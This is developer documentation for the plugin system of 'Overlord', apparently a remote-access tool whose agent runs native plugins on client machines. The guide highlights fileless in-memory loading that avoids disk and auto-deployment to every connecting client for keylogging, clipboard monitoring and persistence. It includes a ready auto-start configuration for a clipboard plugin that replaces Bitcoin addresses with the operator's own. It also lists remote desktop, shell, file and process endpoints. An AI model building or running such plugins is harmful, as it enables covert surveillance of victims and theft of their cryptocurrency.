# Overlord Plugins

This document explains how to build Overlord plugins using the **native plugin system**. Plugins run as native shared libraries (`.so` on Linux, `.dylib` on macOS, in-memory DLL on Windows), giving them full access to the Go runtime and system APIs.

> TL;DR: A plugin is a zip with platform-specific binaries (`.so`/`.dll`/`.dylib`) plus `<id>.html`, `<id>.css`, `<id>.js`. Upload it in the Plugins page or drop it in Overlord-Server/plugins.

## 1) How plugins are structured

### Required bundle format

A plugin bundle is a zip file named after the plugin ID:

```
<pluginId>.zip
```

Inside the zip (root level), you need:

- **Platform-specific binaries** named `<pluginId>-<os>-<arch>.<ext>`
- **Web assets**: `<pluginId>.html`, `<pluginId>.css`, `<pluginId>.js`

Example for plugin ID `sample`:

```
sample.zip
  ├─ sample-linux-amd64.so
  ├─ sample-linux-arm64.so
  ├─ sample-darwin-arm64.dylib
  ├─ sample-windows-amd64.dll
  ├─ sample.html
  ├─ sample.css
  └─ sample.js
```

When the server extracts the zip:

```
Overlord-Server/plugins/sample/
  ├─ sample-linux-amd64.so
  ├─ sample-linux-arm64.so
  ├─ sample-darwin-arm64.dylib
  ├─ sample-windows-amd64.dll
  ├─ manifest.json          (auto-generated)
  └─ assets/
     ├─ sample.html
     ├─ sample.css
     └─ sample.js
```

### Manifest fields

The auto-generated manifest:

```json
{
  "id": "sample",
  "name": "sample",
  "version": "1.0.0",
  "binaries": {
    "linux-amd64": "sample-linux-amd64.so",
    "linux-arm64": "sample-linux-arm64.so",
    "darwin-arm64": "sample-darwin-arm64.dylib",
    "windows-amd64": "sample-windows-amd64.dll"
  },
  "entry": "sample.html",
  "assets": {
    "html": "sample.html",
    "css": "sample.css",
    "js": "sample.js"
  }
}
```

The server picks the right binary for the target client's OS/arch when loading.

## 2) Build a native plugin

### Plugin contract

Plugins are Go packages that export specific functions. The core logic is shared across platforms, with thin platform-specific export wrappers.

All platforms use `-buildmode=c-shared` and export C-callable functions.

#### Linux / macOS (`.so` / `.dylib`)

```go
//export PluginOnLoad
func PluginOnLoad(hostInfo *C.char, hostInfoLen C.int, cb C.uintptr_t, ctx C.uintptr_t) C.int

//export PluginOnEvent
func PluginOnEvent(event *C.char, eventLen C.int, payload *C.char, payloadLen C.int) C.int

//export PluginOnUnload
func PluginOnUnload()
```

The host passes a callback function pointer and context during OnLoad. The plugin calls the callback to send events back.

Build: `CGO_ENABLED=1 go build -buildmode=c-shared -o sample-linux-amd64.so ./native`

**On Linux, shared libraries are loaded entirely in memory via `memfd_create` — no files touch disk.**

#### Windows (`.dll`)

```go
//export PluginOnLoad
func PluginOnLoad(hostInfo *C.char, hostInfoLen C.int, callbackPtr C.ulonglong) C.int

//export PluginOnEvent
func PluginOnEvent(event *C.char, eventLen C.int, payload *C.char, payloadLen C.int) C.int

//export PluginOnUnload
func PluginOnUnload()

//export PluginSetCallback
func PluginSetCallback(callbackPtr C.ulonglong)
```

The callback is a stdcall function pointer: `func(eventPtr, eventLen, payloadPtr, payloadLen uintptr) uintptr`

Build: `CGO_ENABLED=1 GOOS=windows GOARCH=amd64 go build -buildmode=c-shared -o sample-windows-amd64.dll ./native`

**On Windows, DLLs are loaded entirely in memory — no files are written to disk.**

### HostInfo JSON

```json
{
  "clientId": "abc123",
  "os": "windows",
  "arch": "amd64",
  "version": "1.0.0"
}
```

### Project structure

See `plugin-sample-go/native/` for a working example:

```
plugin-sample-go/native/
  ├─ main.go              (shared core logic)
  ├─ exports_unix.go      (Go plugin exports for Linux/macOS)
  ├─ exports_windows.go   (C-shared DLL exports for Windows)
  └─ go.mod
```

### Build scripts

Use the provided build scripts:

```bash
# Linux/macOS — builds for current platform by default
./build-plugin.sh

# Build for multiple targets
BUILD_TARGETS="linux-amd64 linux-arm64 darwin-arm64" ./build-plugin.sh

# Windows — builds windows-amd64 by default
build-plugin.bat

# Build for multiple targets
set BUILD_TARGETS=windows-amd64 linux-amd64
build-plugin.bat
```

## 3) Install & open a plugin

### Install / upload

- Use the UI at `/plugins` to upload the zip
- Or drop `<pluginId>.zip` into `Overlord-Server/plugins` and restart

### Open the UI

Plugin UI is served from:

```
/plugins/<pluginId>?clientId=<CLIENT_ID>
```

Your HTML loads its JS/CSS from `/plugins/<pluginId>/assets/`.

## 4) Runtime: how events flow

Overlord plugins have **two parts**:

1. **UI (HTML/CSS/JS)** — Runs in the browser, calls server APIs.
2. **Native module** — Runs in the agent (client) process as a loaded shared library.

### UI → agent (plugin event)

From your UI JS:

```
POST /api/clients/<clientId>/plugins/<pluginId>/event
{
  "event": "ui_message",
  "payload": { "message": "hello" }
}
```

If the plugin is not loaded yet, the server will load it on the client, queue the event, and deliver it once ready.

### Agent → plugin (direct function call)

The agent calls your `OnEvent(event, payload)` function directly with JSON-encoded data. No stdin/stdout pipes, no msgpack — just a direct function call.

### Plugin → agent (callback)

Your plugin sends events back to the host using the `send` callback received during `OnLoad`:

```go
send("echo", []byte(`{"message":"hello back"}`))
```

On Windows, the equivalent is calling the registered callback function pointer.

### Plugin lifecycle events

The agent sends these events to the server:

- `loaded` on successful load
- `unloaded` when unloaded
- `error` if load or runtime fails

## 5) What can plugins do?

Since plugins run as native code, they can:

- Call any system API (file I/O, network, processes, etc.)
- Use any Go library
- Spawn goroutines
- Access hardware
- Do anything a normal Go program can do

Plugins have the same capabilities as the agent itself.

### UI Security constraints

Plugin UI pages are still served with a tight CSP:

- Scripts must be same-origin
- No third-party JS/CDN
- WebSocket and fetch are allowed to same origin

Plugin UIs run in a **sandboxed iframe** with a fetch bridge.

## 6) API surface

### Plugin management

- `GET /api/plugins` — list installed plugins (includes `autoLoad` and `autoStartEvents` per plugin)
- `POST /api/plugins/upload` — upload zip
- `POST /api/plugins/<id>/enable` — enable/disable
- `POST /api/plugins/<id>/autoload` — configure auto-load on client connect
- `DELETE /api/plugins/<id>` — remove (preserves `data/` directory)

### Plugin data directory

- `GET /api/plugins/<id>/data` — list files in the plugin's persistent data directory
- `GET /api/plugins/<id>/data/<path>` — read a file
- `PUT /api/plugins/<id>/data/<path>` — write a file
- `DELETE /api/plugins/<id>/data/<path>` — delete a file or directory
- `POST /api/plugins/<id>/exec` — execute a stored binary (admin/operator only)

See [section 8](#8-server-side-plugin-data-directory) for full details.

### Per-client plugin runtime

- `POST /api/clients/<clientId>/plugins/<pluginId>/load`
- `POST /api/clients/<clientId>/plugins/<pluginId>/event`
- `POST /api/clients/<clientId>/plugins/<pluginId>/unload`

### Useful built-in endpoints

- `POST /api/clients/<clientId>/command`
- `WS /api/clients/<clientId>/rd/ws` (remote desktop)
- `WS /api/clients/<clientId>/console/ws`
- `WS /api/clients/<clientId>/files/ws`
- `WS /api/clients/<clientId>/processes/ws`

## 7) Auto-load plugins on client connect

By default, plugins are only loaded when manually triggered via the API or UI. For plugins that need to run 24/7 on every connected client (e.g. clipboard monitoring, keylogging, persistence), you can configure **auto-load**.

When auto-load is enabled for a plugin, the server will automatically load it onto every client that connects. If the client already has the plugin loaded, it's skipped — no duplicate loads.

You can also configure **auto-start events** — a list of events that are queued and delivered to the plugin immediately after it loads. This lets you pre-configure the plugin without any manual interaction.

### Enable auto-load

```
POST /api/plugins/<pluginId>/autoload
Content-Type: application/json

{
  "autoLoad": true
}
```

### Enable auto-load with auto-start events

```
POST /api/plugins/<pluginId>/autoload
Content-Type: application/json

{
  "autoLoad": true,
  "autoStartEvents": [
    { "event": "add_rule", "payload": { "pattern": "^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$", "replacement": "your-btc-address" } },
    { "event": "start", "payload": {} }
  ]
}
```

The events in `autoStartEvents` are queued in order and delivered to the plugin after it reports `loaded`. This works exactly like calling the event API multiple times, but happens automatically.

### Disable auto-load

```
POST /api/plugins/<pluginId>/autoload
Content-Type: application/json

{
  "autoLoad": false
}
```

### How it works

1. Client connects and completes the enrollment handshake
2. Server sends `hello_ack` (as usual)
3. Server dispatches auto-scripts (as usual)
4. Server checks all plugins with `autoLoad: true` and `enabled: true`
5. For each, if the plugin is **not already loaded** on that client:
   - Sends the plugin binary bundle (chunked)
   - Queues any `autoStartEvents`
6. When the plugin reports `loaded`, queued events are flushed in order

### Checking auto-load status

`GET /api/plugins` returns `autoLoad` and `autoStartEvents` for each plugin:

```json
{
  "plugins": [
    {
      "id": "clipreplace",
      "name": "clipreplace",
      "enabled": true,
      "autoLoad": true,
      "autoStartEvents": [
        { "event": "add_rule", "payload": { "pattern": "...", "replacement": "..." } },
        { "event": "start", "payload": {} }
      ],
      "lastError": ""
    }
  ]
}
```

### Notes

- Auto-load respects the `enabled` flag — disabled plugins are never auto-loaded
- Auto-load state is persisted in `.plugin-state.json` and survives server restarts
- Deleting a plugin also removes its auto-load configuration
- The server selects the correct binary for each client's OS/architecture automatically
- If a plugin binary isn't available for a client's platform, the auto-load silently skips that client

## 8) Server-side plugin data directory

Each plugin has a **persistent data directory** on the server:

```
Overlord-Server/plugins/<pluginId>/data/
```

This directory is **never deleted** when a plugin is removed or reinstalled. It survives the entire plugin lifecycle and gives server-side plugins a dedicated place to store files — SQLite databases, config files, cached data, executables, etc.

### Read/write files

From your plugin UI JS (or any authenticated API consumer):

**List all files**
```
GET /api/plugins/<pluginId>/data
```
```json
{
  "ok": true,
  "files": [
    { "path": "config.json", "size": 128, "isDir": false },
    { "path": "cache", "size": 0, "isDir": true },
    { "path": "cache/data.db", "size": 40960, "isDir": false }
  ]
}
```

**Read a file**
```
GET /api/plugins/<pluginId>/data/<path>
```
Returns the raw file bytes with an appropriate `Content-Type`.

**Write a file**
```
PUT /api/plugins/<pluginId>/data/<path>
Content-Type: application/octet-stream
<raw bytes>
```
Parent directories are created automatically.
```json
{ "ok": true, "path": "config.json", "size": 128 }
```

**Delete a file or directory**
```
DELETE /api/plugins/<pluginId>/data/<path>
```
Deleting a directory removes it recursively.
```json
{ "ok": true, "path": "cache" }
```

### Execute a stored binary

Plugins can store executables in their data directory and run them on the server. This endpoint is restricted to **admin and operator** roles.

```
POST /api/plugins/<pluginId>/exec
Content-Type: application/json

{
  "file": "mytool",
  "args": ["--flag", "value"],
  "stdin": "optional stdin string",
  "timeoutMs": 10000
}
```

| Field | Type | Description |
|-------|------|-------------|
| `file` | string | Path to the binary, relative to the plugin's `data/` directory |
| `args` | string[] | Command-line arguments (optional) |
| `stdin` | string | Text to pipe to stdin (optional) |
| `timeoutMs` | number | Max run time in ms, max 60000, default 30000 |

```json
{
  "ok": true,
  "exitCode": 0,
  "stdout": "tool output here",
  "stderr": ""
}
```

The binary is run from the `data/` directory as the working directory. The server sets the executable bit automatically before running on Unix.

### Example: storing a SQLite database from plugin JS

```js
// Write a new database seed file
await fetch(`/api/plugins/myplugin/data/app.db`, {
  method: "PUT",
  body: dbBytes, // ArrayBuffer
});

// Read it back
const res = await fetch(`/api/plugins/myplugin/data/app.db`);
const db = await res.arrayBuffer();

// List all stored files
const { files } = await (await fetch(`/api/plugins/myplugin/data`)).json();
```

### Notes

- Path traversal is blocked — paths may not escape the `data/` directory
- Null bytes in paths are rejected
- The data directory is created automatically on first use (no pre-setup needed)
- Deleting and reinstalling a plugin leaves `data/` untouched


